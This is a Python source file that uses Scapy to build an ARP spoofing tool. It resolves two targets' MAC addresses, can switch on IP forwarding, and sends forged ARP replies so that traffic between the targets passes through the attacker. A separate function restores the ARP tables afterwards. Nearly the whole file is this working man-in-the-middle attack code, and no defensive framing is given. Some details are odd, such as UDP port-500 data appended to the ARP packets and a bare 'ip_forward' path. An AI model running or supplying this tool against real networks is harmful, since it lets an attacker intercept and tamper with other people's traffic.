DEFAULTMAC = 'ff:ff:ff:ff:ff:ff'

try:
    from logging import getLogger, ERROR
    getLogger('scapy.runtime').setLevel(ERROR)
    from scapy.all import *
    conf.verb = 0
except ImportError:
    print('[!] Failed to import Scapy')
    sys.exit(1)


""" Pre-attack Module """
class PreAttack(object):
    def __init__(self, target, interface):
        self.target = target
        self.interface = interface
    def get_MAC_Addr(self):
        try:
            return srp(Ether(dst=DEFAULTMAC)/ARP(pdst=self.target),
                timeout=10, iface=self.interface)[0][0][1][ARP].hwsrc
        except Exception:
            print('[!] Failed to get {:} MAC addresse'.format(self.target))
            sys.exit(1)
    # Enable Linux IP forward
    class toggle_IP_Forward(object):
        def __init__(self, path='ip_forward'):
            self.path = path
        def enable_IP_Forward(self):
            with open(self.path, 'w') as file:
                file.write('1')
            return 1
        def disable_IP_Forward(self):
            with open(self.path, 'w') as file:
                file.write('0')
            return 0


""" Attack Functions """
class Attack(object):
    def __init__(self, targets, interface):
        self.target1 = targets[0]
        self.target2 = targets[1]
        self.interface = interface
    def send_Poison(self, MACs):
        send(ARP(op=2, pdst=self.target1, psrc=self.target2, 
                 hwdst=MACs[0])/UDP(sport=500, dport=500)/'THU', 
                 iface=self.interface)
        send(ARP(op=2, pdst=self.target2, psrc=self.target1,
                 hwdst=MACs[1])/UDP(sport=500, dport=500)/'THU',
                 iface=self.interface)
    def send_Fix(self, MACs):
        send(ARP(op=2, pdst=self.target1, psrc=self.target2, 
                 hwdst=DEFAULTMAC, hwsrc=MACs[0]), iface=self.interface)
        send(ARP(op=2, pdst=self.target2, psrc=self.target1, 
                 hwdst=DEFAULTMAC, hwsrc=MACs[1]), iface=self.interface)

